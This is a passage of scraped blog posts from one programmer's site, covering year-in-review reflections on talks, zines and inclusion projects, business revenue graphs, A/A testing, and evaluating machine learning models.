understanding/defining my job this year. I wrote  What’s a senior engineer’s job?  about that, but I have not yet reached enlightenment. \n\n talks! \n\n I gave 4 talks in 2018: \n\n \n So you want to be a wizard  at StarCon \n Building a Ruby profiler  at the Recurse Center’s\nlocalhost series \n Build Impossible Programs  in May at Deconstruct. \n High Reliability Infrastructure Migrations  at\nKubecon. I’m pretty happy about this talk because I’ve wanted to give a good talk about what I do\nat work for a long time and I think I finally succeeded. Previously when I gave talks about my\nwork I think I fell into the trap of just describing what we do (“we do X Y Z” … “okay, so\nwhat?“).  With this one, I think I was able to actually say things that were useful to other\npeople. \n \n\n In past years I’ve mostly given talks which can mostly be summarized “here are some cool tools” and\n“here is how to learn hard things”. This year I changed focus to giving talks about the actual work\nI do – there were two talks about building a Ruby profiler, and one about what I do at work\n(I spend a lot of time on infrastructure migrations!) \n\n I’m not sure whether if I’ll give any talks in 2019. I travelled more than I wanted to in 2018, and\nto stay sane I ended up having to cancel on a talk I was planning to give with relatively short\nnotice which wasn’t good. \n\n podcasts! \n\n I also experimented a bit with a new format: the podcast! These were basically all really fun! They\ndon’t take that long (about 2 hours total?). \n\n \n Software Engineering Daily , on rbspy and how to use a profiler \n FLOSS weekly , again about rbspy. They told me\nI’m the guest that asked  them  the most questions, which I took as a compliment :) \n CodeNewbie  on computer networking\n& how the Internet works \n Hanselminutes with Scott Hanselman  on writing zines / teaching / learning \n egghead.io , on making zines & running a business \n \n\n what I learned about doing podcasts: \n\n \n It’s really important to give the hosts a list of good questions to ask, and to be prepared to\ngive good answers to those questions! I’m not a super polished podcast guest. \n you need a good microphone. At least one of these people told me I actually couldn’t be on their\npodcast unless I had a good enough microphone, so I bought a  medium fancy microphone . It wasn’t too expensive and it’s nice to have a better quality microphone! Maybe I will use it more to record audio/video at some point! \n \n\n !!Con \n\n I co-organized  !!Con  for the 4th time – I ran sponsorships. It’s always\nsuch a delight and the speakers are so great. \n\n !!Con is expanding  to the west coast in 2019  – I’m not directly\ninvolved with that but it’s going to be amazing. \n\n blog posts! \n\n I apparently wrote 54 blog posts in 2018. A couple of my favourites are  What’s a senior engineer’s job? \n,  How to teach yourself hard things , and  batch editing files with ed . \n\n There were basically 4 themes in blogging for 2018: \n\n \n progress on the rbspy project while I was working on it ( this category ) \n computer networking / infrastructure engineering (basically all I did at work this year was\nnetworking, though I didn’t write about it as much as I might have) \n musings about zines / business / developer education, for instance  why sell zines?  and  who pays to educate developers? \n a few of the usual “how do you learn things” / “how do you succeed at your job” posts as I figure\nthings about that, for instance  working remotely, 4 years in \n \n\n a tiny inclusion project: a guide to performance reviews \n\n Last year  in addition to my actual job, I\ndid a couple of projects at work towards helping make sure the performance/promotion process works\nwell for folks – i collaborated with the amazing  karla  on the idea of a “brag\ndocument”, and redid our engineering levels. \n\n This year, in the same vein, I wrote a document called the “Unofficial guide to the performance\nreviews”. A lot of folks said it helped them but probably it’s too early to celebrate. I think\nexplaining to folks how the performance review process actually works and how to approach it is\nreally valuable and I might try to publish a more general version here at some point. \n\n I like that I work at a place where it’s possible/encouraged to do projects like this. I spend a\nrelatively small amount of time on them (maybe I spent 15 hours on this one?) but it feels good to\nbe able to make tiny steps towards building a better workplace from time to time. It’s really hard\nto judge the results though! \n\n conclusions? \n\n some things that worked in 2018: \n\n \n setting  boundaries  around what my job is \n doing open source work while being paid for it \n starting a side business \n doing small inclusion projects at work \n writing zines is very time consuming but I feel happy about the time I spent on that \n blogging is always great \n \n\n"},
{"url": "https://jvns.ca/blog/2023/01/10/some-business-graphs-for-2022/", "title": "Some business graphs for 2022", "content": "\n     \n\n Hello! I like looking at  other independent authors’  business graphs, so I thought I’d\nshare some percentages and graphs of my own this year. Hopefully some of this\nis useful to other writers who run internet businesses. \n\n All of the graphs are about  Wizard Zines ’ business selling zines – I don’t do sponsorships or consulting or commissions or anything. \n\n print vs digital sales \n\n \n \n \n\n This year 58% of sales were digital and 42% were print. I’m really happy with\nthis: when I decided to start printing and shipping zines in 2021, I was a bit\nworried that nobody would buy them. But we’ve sold out our first two print runs\nand it’s been going great. \n\n \nNote: PDF means “PDF you can read on your computer or print at home”, print means “print version that’s physically shipped to you”\n \n\n corporate vs personal sales \n\n I sell both corporate licenses (“buy this zine for your team!”) and personal\ncopies. I think having corporate sales is great, but it feels like it would be risky to\nbe too dependent on a small number of corporate customers. So I keep an eye\non the percentage of corporate sales. \n\n We’re at about 16% corporate sales for 2022 (as a percentage of revenue), which\ndoesn’t seem too high. It looks like this number has been pretty flat over time. \n\n \n\n PPP sales \n\n I run a PPP (“purchasing power parity”) program where I give a discount to\nfolks from countries with a weaker currency relative to the US. We’ll look at a\ncouple of things here: \n\n \n How many different countries are represented? \n Which countries are the biggest users of PPP? \n What percentage of revenue is from these sales? \n \n\n Here are some graphs: \n\n \n\n People from 81 different countries used the program (so many!!), and the\nbiggest two users are India and Brazil. This has been the case as long as I can\nremember, presumably because India and Brazil are two of the biggest countries\nin the world. \n\n About 5% of revenue comes from sales with PPP discounts. \n\n bundles vs individual zines \n\n It used to be that you could only buy individual zines on the store – if you\nwanted to buy a bundle, you had to buy each one individually. But then one day\nsomeone suggested I add a way to buy all of the zines at once. \n\n I did, and this turned out to be a very important business decision – here’s\na graph of the percentage of revenue from zine bundles (“packs”) over time: \n\n \n\n In 2022 it was 65% of revenue (up from 3% in 2018, which I guess is when I added zine packs for the first time). \n\n platforms \n\n I used to sell everything on Gumroad, now I sell everything on Shopify. \n\n I could include some graphs here, but I think it’s not that interesting – it’s\nmostly a slow migration from 2020 to 2023, where 2020 was 100% Gumroad and 2023\nis 100% Shopify. \n\n Some reasons I switched to Shopify: \n\n \n I need to sell print zines, and Shopify has inventory management. Also the amazing fulfillment company I use\n( White Squirrel ) uses a Shopify plugin. \n Since I needed to be using Shopify anyway for print zines, it felt easier to\nhave everything on one platform. \n Right now Gumroad charges 10% (7% + processing fees), and Shopify charges $38/month\nplus processing fees. I actually pay more like $150/month including various\nShopify plugins, but for me $150/month is a lot less than 7% of revenue. \n \n\n Moving from Gumroad to Shopify took probably a month of energy in 2022 but it\nwas worth it to have everything in one place. \n\n revenue graph for 2020-2022 \n\n Here’s a graph of (relative) revenue. The blue and the purple are Shopify / Gumroad percentages, because of the Gumroad -> Shopify migration I mentioned in 2021 and 2022. \n\n \n \n \n\n You can see that revenue for 2022 was less than 2020, but quite a bit more than 2021. \n\n This is related to the number of zines released each year: \n\n \n 2 zines in 2022 (The Pocket Guide to Debugging and How DNS Works), but only 1 \n 1 zine in 2021 (Bite Size Bash) \n 3 zines in 2020 (Become a SELECT Star, How Containers Work, Hell Yes! CSS!) \n \n\n I put this towards the end because this is not something I try not to worry about\ntoo much – every year so far the business has made comfortably enough to pay\neveryone. If that looks like it might change, I’ll worry about it. \n\n revenue by month \n\n Here’s a graph of revenue by month for 2022 (and the first month of 2023 so far). \n\n \n\n You can see two giant spikes: in April and December when we released new zines.\n( The Pocket Guide to Debugging has done super well  so far, thanks to all of you\nwho bought it! Print copies are on track to ship around the end of January.). \n\n You can also see the Shopify / Gumroad migration happening in this graph – in\nMay I stopped using Gumroad completely. \n\n revenue by country \n\n I got curious about which countries most sales come from, so I drew a graph. I\ncombined the EU into one big group because there are a lot of European\ncountries and I do a lot of special case stuff for Europe (for tax issues etc). Here’s the graph: \n\n \n\n In numbers, that’s: \n\n \n US: 59.63% \n Europe: 14.71% \n Canada: 6.62% \n UK: 5.40% \n Australia: 3.35% \n Other: 10.29% (there are 117 countries in there) \n \n\n Mostly what this tells me is that 40% of revenue comes from outside of the US\n– that’s a lot! I already offer free international shipping for large orders,\nbut it makes me want to figure out if it’s possible to improve the\ninternational shipping situation for small orders too. \n\n If we look at  copies  by country instead of revenue, this looks a bit\ndifferent – India and Brazil are both above Australia. \n\n more country data \n\n Here’s a more detailed list of revenue percentages per country, if you want to break\nthat “Europe” category above down more. \n\n \n US: 59.65% \n Canada: 6.57% \n United Kingdom: 5.43% \n Germany: 4.81% \n Australia: 3.34% \n France: 1.85% \n Netherlands: 1.58% \n India: 1.41% \n South Africa: 1.3% \n Switzerland: 1.15% \n Spain: 0.88% \n Sweden: 0.87% \n Brazil: 0.85% \n New Zealand: 0.82% \n Ireland: 0.7% \n Singapore: 0.64% \n Poland: 0.62% \n Norway: 0.61% \n Belgium: 0.5% \n Italy: 0.43% \n Finland: 0.42% \n Austria: 0.39% \n Denmark: 0.35% \n Portugal: 0.34% \n Mexico: 0.32% \n \n\n And the full list of 126 countries where customers came from this year is:\nCanada, United States, Australia, Netherlands, United Kingdom, Denmark,\nAustria, Belgium, Spain, Mexico, Italy, Greece, France, Sweden, Finland,\nGermany, New Zealand, Switzerland, Malaysia, Norway, Israel, India, Iceland,\nIreland, Portugal, China, Brazil, Argentina, Colombia, Czechia, Poland, Chile,\nSaudi Arabia, Bangladesh, Thailand, Belarus, Georgia, South Africa, Serbia,\nKenya, Slovenia, Taiwan, Indonesia, Russia, Bhutan, Lithuania, Nigeria,\nSingapore, Maldives, Morocco, Japan, Sri Lanka, Romania, Egypt, Turkey, El\nSalvador, Estonia, United Arab Emirates, Malta, Vietnam, Ukraine, Macao,\nCroatia, Latvia, Jamaica, Iraq, Slovakia, Algeria, Philippines, Ecuador,\nCyprus, Bulgaria, Jordan, Montenegro, Pakistan, Hungary, South Korea,\nKyrgyzstan, Costa Rica, Ghana, Armenia, Peru, Hong Kong, Kazakhstan, Mongolia,\nTunisia, Uruguay, Madagascar, Guatemala, Afghanistan, Angola, Bolivia, Uganda,\nTanzania, Venezuela, Dominican Republic, Nepal, Réunion, Antigua and Barbuda,\nQatar, Gibraltar, Azerbaijan, Guinea, Moldova, Sudan, Bahamas, Sierra Leone,\nSeychelles, Pitcairn, Uzbekistan, Bosnia and Herzegovina, Cambodia, Rwanda,\nHonduras, Benin, Kuwait, Cameroon, Puerto Rico, Turks and Caicos, Trinidad and\nTobago, Senegal, North Macedonia, Botswana, Mauritius, Nicaragua. \n\n It’s fun to see so many countries on the list! \n\n how were the graphs generated? \n\n One person asked how these graphs were generated. Basically I have: \n\n \n a “data warehouse”  (a small 100MB SQLite database) \n a few scripts that use  sqlite-utils  to import data from the Shopify / Gumroad APIs into the “warehouse”, that run in a cron job on my laptop \n one view that combines my Gumroad sales and Shopify sales into a single table called  all_sales \n a  Metabase  installation on my laptop where I can write SQL to make dashboards and graphs. Metabase is an open source BI tool. \n \n\n This setup has worked great, I really like Metabase. All of the graphs are screenshots from Metabase. \n\n people \n\n Finally, I want to thank everyone who worked with me on the zines this year. I\ncouldn’t do it without them. We had: \n\n \n Marie Claire LeBlanc Flanagan (we worked together on writing pretty much every weekday in 2022) \n Dolly Lanuza (editing) \n Gersande La Flèche (copy editing) \n Vladimir Kašikovi&cacute; (cover illustration) \n All of the beta readers who read and commented on early versions of the zines \n The team at  White Squirrel  (fulfillment/shipping) \n The team at  Girlie Press  (printing) \n \n\n Also my partner Kamal reads every zine before it’s published and he always\ngives me great advice. \n\n And of course I couldn’t do any of this without the readers who support\nall of this work ❤. \n\n"},
{"url": "https://jvns.ca/blog/2020/12/31/2020--year-in-review/", "title": "2020: Year in review", "content": "\n     \n\n I write these  every year , so here’s 2020!\nI’m not going to really go into the disaster that was 2020, I’m just going to\ntalk about some things I worked on. So here are some things I did this year and\na few reflections, as usual. I’m much more grateful than usual that my family and friends are generally healthy. \n\n zines! \n\n I published 4 zines: \n\n \n Hell Yes! CSS! \n Bite Size Bash \n Become a SELECT Star \n How Containers Work \n \n\n This year definitely had an accidental “weird programming languages” theme\n(bash, CSS, and SQL) which I kind of love. I’m also really delighted I finally\nmanaged to publish that containers zine, because I’d wanted to write it for a\nlong time and I’m really happy with how it turned out. \n\n For two of these zines, I also made companion websites with examples: \n\n \n Become a SELECT Star:  SQL playground \n Hell Yes! CSS!:  CSS examples \n \n\n Both of those sites are trying to get at a tension that I always feel with my\nzines which is – you can’t really learn about computers without trying things!\nSo they both give you a way to quickly try things out and experiment. \n\n I’m still honestly not sure how well these are working because I haven’t gotten\na lot of feedback on them (positive or negative), but I still feel that this is\nimportant so I’m going to keep working on this. \n\n a redesign of wizardzines.com \n\n I redesigned  https://wizardzines.com  this year! As with any website\nredesign, I think this is like 50x more exciting to me than literally anyone\nelse in the universe so I won’t say too much about it, but it has a fun\nanimations, I think the information is a better organized, and I really love\nit. \n\n You can see what it looked like\n before  and  after .  Melody Starling  did\nall the design and CSS work. \n\n I basically wrote the CSS zine because we did this project and I was so amazed\nand delighted by what Melody could do with CSS that I had to write a zine about\nCSS. \n\n I shipped some zines! \n\n I wanted to print and ship some zines in 2020, and I did! I had kind of Grand Ambitions for this and in reality what happened was: \n\n \n I got 400 copies of “Help! I have a Manager!” printed in February \n there was a pandemic and I got distracted so I left them in a box in my\nhouse for 6 months \n I finally got around to announcing them in August and shipped the zines to\npeople in September \n \n\n I wanted the whole thing to feel special, so I designed & printed custom\nenvelopes and got a local stamp maker to design a stamp to stamp the envelope\nseal with. Here’s what it looked like: \n\n \n \n\n I got a lot of excited tweets from people receiving their zines, which was\nreally nice. \n\n The main problems I ran into were: \n\n \n shipping is a lot of work, it took me maybe 2-3 days to get all 400 zines\npackaged and shipped \n in order for me to charge a reasonable price ($16 USD/zine), I had to ship\neverything with letter mail, which mostly worked but some people didn’t get\ntheir zines or it took many weeks for the zines to arrive. And there was no\ntracking so it was hard/impossible for me to find out about problems. \n \n\n I definitely want to ship more zines, but I think I might have to do it in a\nless fun and artisanal way. We’ll see! \n\n learning experiment: questions \n\n One of my experiments in helping pepole learn this year was a site called “questions!”, which you can try at\n https://questions.wizardzines.com/  (for example here are some  questions about CORS . \n\n The idea is that it asks you questions about a topic as a way for you to find\nout what you don’t know and learn something. \n\n I spent a lot of time figuring out how to make this not feel like a quiz. The\nfirst version of this I built was called\n flashcards , and while people seemed to\nlike those, I found that too many people were reacting to it with “I got  9 ⁄ 10 !”\nas if the goal was to get as many questions right as possible. \n\n To make it clearer that the point was to learn, we made the primary\ninteraction on the site clicking on “I learned something!” (which triggers an\nanimation and a lightbulb). So you don’t get rewarded for already knowing the\nthing, you get rewarded for learning something new. \n\n I also published an open source version of the site, if you want to make your own:\n https://github.com/questions-template/questions-template.github.io . I’d be really interested to hear if anyone does. \n\n Melody  designed this site too. \n\n I still feel a bit unsure about the future of this project, but I’m happy with\nwhere I got with it this year. \n\n learning experiment: domain name saturday \n\n With my friend  Allison Kaptur , I ran an event called\n“Domain Name Saturday” at the  Recurse Center  where\nyou write a DNS server in 1 day. \n\n It turns out it’s impossible to write a DNS server in 1 day (literally nobody\nsucceeded, but I think it might be possible in 2 days). But it was a really fun\nexercise and a lot of people made very significant progress. At the end we did\na “bug presentations” event where people presented their favourite bug they ran into\nwhile writing their DNS server. I really liked this structure because it’s easy\nfor everyone to participate no matter how far they got (everyone has bugs!),\nand people’s bugs were really interesting! \n\n I think it’s a super fun exercise for learning about networking and parsing\nbinary data and I’m excited to try to run it again someday. \n\n we ran !!Con remotely! \n\n !!Con West was the last thing I did before the pandemic, back on March 1 in the\nvery last days of in-person conferences. \n\n We ran !!Con NYC remotely this year (you can watch  the\nrecordings !). It was a delightful\nbright spot this year. I think it really worked well as a remote conference\nbecause !!Con (unlike a lot of conferences) really is largely about the talks\nand about the joy of watching a lot of delightful talks together. \n\n I think we managed to reproduce the experience of sitting in a big room and\nclapping and being excited about a fun shared experience pretty well (through\ndiscord and a lot of clapping emojis). It was definitely much harder to actually\ntalk to individual people. \n\n We charged $64 for tickets (pay-what-you-can), which included a conference tshirt mailed to your\nhouse in the ticket price. So I wrote a Python script to mail a few hundred\nconferences tshirts / sweaters to people with Printful. It was fun but next\ntime I’d probably just make a Shopify/Squarespace store and give everyone a\ncode to order a free shirt though, it involved a little too much customer\nsupport caused by bugs in my script :) \n\n running a business is going well! \n\n Last year at this time, I said I was going to take until August 2020 and\nreevaluate how I felt about this whole “running a business” thing. When\nAugust came around I felt like I was generally having fun and the business is\ndoing well. So “reevaluate how I felt” turned into “shrug and keep doing what\nI’m doing”. \n\n Revenue is up 2.3x over last year, which is incredible and probably very\nrelated to the fact that I published twice as many zines. \n\n I continue to enjoy being able to easily understand what value the work I’m\ndoing brings to the world and having a lot of control over my time. I still\nmiss having coworkers though :) \n\n what went well \n\n \n working with other people . I’m not going to list everyone here but I\nwrote a personal 2020 retro and a lot of my high points were like “I got\nto work with X person and it was SO GREAT and I couldn’t have done any of\nthese things without them” \n beta readers . I started asking beta readers to read my zines and tell me\nwhich parts are confusing and it was AMAZING. If you were one of these 50-ish\npeople, thank you so much! \n new tools . I started using Trello to track what needs to be done for my\nzines instead of literally no organizational system at all and it really\nhelped a lot. I also started using  focusmate \nto, well, focus, and that helped a lot too. I wrote probably 80% of the bash\nzine in Focusmate sessions and it was a lot faster and less stressful. \n royalties . I got to pay out more royalties this year and that was\nreally cool. \n I kept learning about running a business and wrote my first blog post about what I’ve learned:\n A few things I’ve learned about email marketing .\nI don’t want to get too much into giving business advice, but I think I want to write a couple more posts about what I’ve learned next year. \n \n\n some questions about 2021 \n\n I don’t think anyone can answer these except me, but here are a few work things\nthat are on my mind: \n\n \n For some reason I feel compelled to make more educational things that aren’t\nzines, like these little websites I talked about earlier that ask you\nquestions or let you run SQL queries / try out CSS ideas. I have another\nproject that I’ve started here that I’ll write about later. \n I’m not sure what I’m going to do about printing/shipping, I really\nliked the artisanal way I did it this year, but it was a lot of work. \n As always, I have very few ideas about what I’m going to write a zine about\nnext. It’s always like this but it always feels hard to come up with ideas. I\ndo have 1 idea for my next zine though which is a lot more than usual! Maybe\nit’ll work out! \n \n\n here’s to 2021 being a better year \n\n Stay safe everyone. Happy new year. \n\n"},
{"url": "https://jvns.ca/blog/2015/02/06/a-a-testing/", "title": "A/A testing", "content": "\n      Thursday evening I organized a meetup called Data Science: Inconvenient\nTruths where the amazing  Diyang Tang ,\n Clare Corthell , and\n Elena Grewal  told great stories about\nthings that have gone wrong when doing machine learning or data\nanalysis. \n\n Elena gave a talk ( video of a previous version )\nabout common mistakes you can make when running experiments. I was super\nexcited to hear her talk because I’m working on an experiment right now\nat work and trying to interpret the results. The whole talk is great –\nit has really good examples of experiments Airbnb has worked on – and\nyou should watch it, but I want to talk about the very small part where\nshe mentions A/A\ntesting. \n\n I’ve heard of  A/B testing !\nBut I’d never heard of A/A testing before, didn’t really understand\nwhat she meant at the time, and didn’t manage to ask. (pro tip: ask\nquestions when you have them :)). I slept on it, and I now think a) that\nI get it and b) it’s really simple and c) that it’s SUPER COOL AND MAYBE\nUSEFUL TO ME. \n\n Let’s pretend I have a widget store, and that I’m running an experiment\nwhere I have a Great Idea that I think will sell WAY MORE WIDGETS. I’ve\nrolled out my Great Idea to 33% of users, and I have a gorgeous\ndashboard that says that my Great Idea group has 2% higher sales than my\nother group, like this: \n\n \n\n A 2% increase in sales is a pretty big deal! But how do I know that\nthese results are actually significant? One great way is to do\nstatistics – Dan McKinley built this calculator which you can see\n here  that makes some assumptions\nand tells you how long you’ll need to run your experiment for to see\nstatistical significance. \n\n But let’s say you want to get a rough sense for whether or not your\nresults might be significant without doing statistics. \n\n This is where A/A testing comes in! The idea here is to compare two\nsets of users in the same experimental group and see how high the\nvariation is. So instead of having a Great Idea group and a Control\nGroup, we’ll use  two  control groups. And then we might see something\nlike this: \n\n \n\n Suddenly, the group we’re experimenting on doesn’t look so good anymore.\nIt looks like any difference is likely to be just because of random\nnoise. If we’d instead seen something like this, we’d be much more\nlikely to believe that the Great Idea is actually doing well: \n\n \n\n I like this because it seems like it can give you a rough sense for how\nsignificant your results are without having to decide on a statistical\nmodel. And it’s super intuitive! A question like “if we compare two\ngroups of this size with the same characteristics, do we naturally see a\nlot of variation?” is a great smoke test. \n\n Once I got off a plane and looked up what A/A testing actually is, I\nfound out the graph above has a name! It’s called A/A/B testing, and A/A\ntesting is when you literally just run an experiment where both groups\nare the same :) \n\n"},
{"url": "https://jvns.ca/blog/2017/12/31/2017--year-in-review/", "title": "2017: Year in review", "content": "\n     \n\n Hello! Let’s talk about 2017 in julia’s programming/work life, not in the world-at-large. \n\n things that went well at work \n\n \n I worked on a project (with a few other people on my team) that I was proud of! We shipped our\nfirst Kubernetes cluster. I wrote a blog post about the project on the company blog:  Learning how to\noperate Kubernetes reliably . \n wrote a few kubernetes pull requests that got merged (this is a pretty minor accomplishment but I\ndon’t do a lot of open source so it was a step in a direction I’m excited about) \n I mentored an intern for the first time!! And I think it went really well! (not least because the\nintern I got to work with was awesome) \n I stayed on the same team (modulo some reorgs), and I really like my team! We’re in charge of orchestration systems like Kubernetes & Jenkins. \n I got promoted at the beginning of the year. That was cool because I felt like I’d improved a lot\nand so it was nice to see that recognized. \n I got a new manager at the beginning of the year ( Jay! ) and I like working with him a lot. \n \n\n One thing I really like about my current team is – because we do a lot of reliablity/security work,\nthere’s a lot of focus on  understanding our systems . In my current job I have a lot of space to\ntake the time to really dig into weird stuff and figure out why it’s happening, which makes me\nhappy. (taking the time to figure out weird things out is a lot of what that “operating Kubernetes”\nblog post was about). \n\n I think maybe 2017 was the best year at work so far? I learned a lot about operations & reliability\n& networking & infrastructure security & containers & how to get organizational projects done, and I\nfeel like I was able to work on some things that are important to me. \n\n inclusion projects \n\n It’s been a goal of mine for a long time to do projects that improve inclusion at work. This is the\nfirst year where I feel like I made some significant progress on this. (though in 2016 I wrote this  infrastructure engineer job description  which was also a small inclusion project!)  This section is kinda long but\nhere goes. \n\n By “inclusion”, I basically mean – make sure that everyone’s work is recognized equally and that\neveryone has the same opportunities. My view is that it’s kind of everyone’s job to help build an\ninclusive company, so I want to sometimes make contributions in this area! \n\n One thing I’ve found really hard is – what does “working on inclusion” actually mean? How do you do\na project that results in better inclusion at your company? \n\n I’ve come to realize that there’s a lot of inclusion work that people generally agree is a good\n idea  (like “make our engineering ladders more objective”), but that nobody has found the time to\nactually do yet (see: lara hogan’s  why can’t they just? ). Organizational projects take a lot of time! I have some time! So if I can find\na way to effectively spend my time on inclusion-themed projects, I can make a difference! \n\n I did 2 inclusion-y projects in this direction this year: one big, one small. \n\n Big thing: I worked on revamping our engineering career ladder, in an attempt to make it more clear\nand objective. I wrote the new ladder, created a lot of concrete examples, talked to more than 30\npeople in engineering to get their feedback, and used their feedback to improve it. \n\n This was really hard and it took a long time (2-3 months of working on it part-time) but I think it\nturned out well (the new ladder is definitely more objective!) and I’m happy I spent time on it. It\ngave me a lot of sympathy for why this kind of change is hard to make, but also made me feel like I\nwas empowered to make changes if I was willing to put the work in. \n\n I did this project in collaboration with a  manager  who is really good\nat figuring out how to make organizational change. I think we were a good team – I had  time  to\nspend writing & revising the ladder (which he had less of), and he knew how to navigate the process\nfor making the new ladder official (which I had no idea how to do). \n\n Smaller thing (in the same area): I worked a bit on marketing internally this idea of a “Brag\nDocument”. Basically this is a document where you write down all your accomplishments at your job so\nfar. I think this is useful because: \n\n \n it’s a good way to reflect and see what’s going well \n it makes it easier for your manager to make the case that you should be promoted \n if you have a new manager, it tells them what you’ve been doing in your career so far (otherwise\nthey might never find out!) \n it makes it easier to write a self-review during performance review season (perf review is tied to\ncompensation, so it’s very useful to make sure that you actually explain what your accomplishments\nwere) \n \n\n This isn’t a revolutionary idea (“keep track of your accomplishments” is something a lot of people\ndo!!) but I think publicizing the idea is useful because not everyone thinks to do it! \n\n Concrete work I did on this: I helped run a workshop to get some folks to write these documents, and\ngave a lightning talk to all of infrastructure about why I think it can be useful to write a\ndocument like this. I don’t know how useful this will turn out to be, but we’ll see! \n\n (Of course I didn’t do either of these things by myself, and lots of people work in these areas\nindependently of me. I got to work with some managers ( will   &\n jay , my current manager) who helped me a lot to figure out what it means to work on\ninclusion. And the fact that working on projects like this is something that’s actively\nrewarded/encouraged by leadership is of course a huge part of what makes it possible/sustainable to\ndo.) \n\n what’s a tech lead? \n\n For the second half of 2017 I’ve been a “tech lead” on my team, and I’ve been trying to figure out\nwhat that… means. It definitely  doesn’t  mean I’m in charge of making all of the decisions –\neveryone on the team makes  decisions, and I certainly don’t have all the answers! :). So what does\nit mean? Some things that I’ve been focusing on: \n\n \n make sure new folks on the team have the information/support they need to get stuff done \n make sure the projects we’re working on have a manageable scope and that we understand clearly why\nwe’re doing them \n communicate with people outside of our team about what our team is doing \n \n\n I think I still have a lot to learn about this role, but those 3 things are all things that I think\nare important, that take time, and are things that I can do. So that’s good! \n\n “make sure that when there are incidents we actually fully understand exactly why they happened” is\nalso a thing I pay a lot of attention to, though I think everybody else does too. \n\n Someone internally did a survey of things different “tech leads” inside infrastructure do, and\ndiscovered that different people have very different styles, and there isn’t any single way to do\nit. \n\n zines \n\n Enough work things! \n\n I released 4 zines this year. (see  https://jvns.ca/zines ): 3 regular zines and one collection of\nthe comics I made last year. That is 4 times as many as last year! \n\n I’m working on a zine about perf right now, so there will be at least one zine next year. I\ncontinued to give out zines at every conference talk I give which I’m very happy about. \n\n \n.zines {\n    display: flex;\n    flex-flow: row wrap;\n    align: center;\n}\n\n.blah {\n    display: flex;\n}\n \n\n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n\n \n \n \n \n\n \n \n \n \n \n \n\n \n\n talks \n\n talks from this year: \n\n \n keynoted PyCon Canada (“so you want to be a wizard”) \n keynoted SRECon  (“so you want to be a wizard”) \n keynoted QCon Shanghai (“so you want to be a wizard”) \n spoke at Monitorama (“linux debugging tools you’ll love”) \n attended netdev, on linux kernel networking (I didn’t speak, but mentioning it just because I\nthink I learned more from it than from any of the 4 conferences I spoke at. Food for thought.) \n \n\n Basically I wrote one keynote-y talk ( So you want to be a wizard ) and gave it 3 times. I think the version from PyCon Canada in\nNovember was maybe my favourite, I’m excited for the video to be up. It was fun to get to go to\nShanghai! \n\n speaking plans for 2018: \n\n \n go to  StarCon  next week (“so you want to be a wizard”, for the last time) \n speak at  Deconstruct  in May, which I’ll write a new talk for\n(likely about building open source projects & what I did on sabbatical, which is still unknown\nbecause it hasn’t happened yet) \n maybe give one talk in an interesting new country in October/November? \n maybe go to a Ruby conference, since I’m working on Ruby tooling right now and haven’t met\nmany of folks in the Ruby community? \n maybe apply to Strange Loop again (I spoke there in 2014 & 2016, so in keeping with the theme of\nstrange loop in even years…? =)) \n \n\n One vague idea for talks & writing in 2018 is – in 2017 I talked about how to  learn . I have\ntalked a lot here about how to learn. I sort of feel like maybe I’ve covered that? Maybe in 2018 I\nwill talk about how to  build  new things that did not exist before. I still feel like I have a\nlot of room to get better at building, especially building-in-the-open outside of work. \n\n blogging \n\n I wrote 77 posts in 2017. Blogging themes in 2017 included: \n\n \n kubernetes (since I spent like half the year working on it). for instance  this post about how the scheduler works that i wrote when fixing a bug in the scheduler \n linux networking (related to Kubernetes, and some of my team’s other work) \n operations & reliability ( what can developers learn from being on call? ) \n linux profiling & tracing (as usual) \n Rust (leading up to working in Rust for the next 3 months) \n random things about cool things on the internet (like  Binder ) \n \n\n There’s an ongoing issue where I write about linux profiling & tracing tools a lot but I don’t\nactually work with those things that often in my day-to-day work. This is weird. I’m excited to\nspend some time writing a profiler in the next few months to change that temporarily. \n\n sabbatical \n\n In 2017 I did a cool thing for myself – I planned a  sabbatical for myself in the first quarter of this year, to work on Ruby profiling tools . It\nofficially starts tomorrow! \n\n I feel really happy with past-julia’s foresight in planning some time off to do a new interesting\nthing. And it’s a good reminder that cool interesting opportunities don’t just  happen , I need to\ndo work to plan them and figure out how to make them work in my life. \n\n"},
{"url": "https://jvns.ca/blog/2014/11/16/fun-with-machine-learning-making-sure-your-model-actually-works/", "title": "Fun with machine learning: does your model actually work?", "content": "\n      I’m writing a talk for  PyData NYC \nright now, and it’s the first talk I’ve ever written about what I do at\nwork. \n\n I’ve seen a lot of “training a model with scikit-learn for beginners”\ntalks. They are not the talk I’m going to give. If you’ve never done any\nmachine learning it’s fun to realize that there are tools that you can\nuse to start training models really easily. I made a  tiny example of\ngenerating some fake data and training a simple\nmodel  that\nyou can look at. \n\n But honestly how to use scikit-learn is not something I struggle with,\nand I wanted to talk about something harder. \n\n I want to talk about what happens after you train a model. \n\n How well does it work? \n\n If you’re building a model to predict something, the first question\nanyone’s going to ask you is: \n\n “So, how well does it work?” \n\n I often feel like the only thing I’ve ever learned about machine\nlearning is how important it is to be able to answer this question, and\nhow hard it is. If\nyou read Cathy O’Neil’s blog posts about  why models to measure teachers’ teaching are flawed ,\nyou see this everywhere: \n\n \n we should never trust a so-called “objective mathematical model” when\nwe can’t even decide on a definition of success \n\n If it were a good model, we’d presumably be seeing a comparison of\ncurrent VAM scores and current other measures of teacher success and\nhow they agree. But we aren’t seeing anything like that. \n \n\n If your model is actually doing something important (deciding whether\nteachers should lose their jobs, or how risky a stock portfolio is, or\nwhat the weather will be tomorrow), you  have to measure if it’s\nworking . \n\n \n\n There’s no fixed answer to how to do this – if it were easy,\nstatisticians wouldn’t have jobs. If you looked at the notebook I linked\nto, we looked at the confusion matrix for our classifier: \n\n [[8953 3508]\n [3500 9039]]\n \n\n We could have instead calculated a score (0.2, 0.8, …) for each data\npoint and looked at something called the ROC curve (one day maybe I will\nexplain how  Steven Noble  told me how to\nread one of these even though I thought I understood them already) \n\n Here’s the ROC curve for the model we just built. It’s much prettier\nthan a real-life ROC curve will normally be, with no jagged edges. \n\n \n\n This graph shows you the tradeoffs you’re making between catching the\nstuff you want (true positive rate) and dealing with the stuff you don’t\nwant (false positive rate). It’s a Very Useful Graph. \n\n You might have a notion of how much money this model would save you, and\nwant to graph that. Or maybe you care that some data is classified\ncorrectly more than other data, and you need to express that in some\nway. Or you’re predicting the weather for sailors and you need to make\nsure that really extreme weather is handled well so that nobody dies. \n\n This also isn’t quite what I want to talk about, though! It’s more than\nI feel that I can really do justice to, and I’m still learning how to\nthink about it slowly. Here’s what I actually want to talk about: \n\n How well did it work in April? \n\n Right now it’s 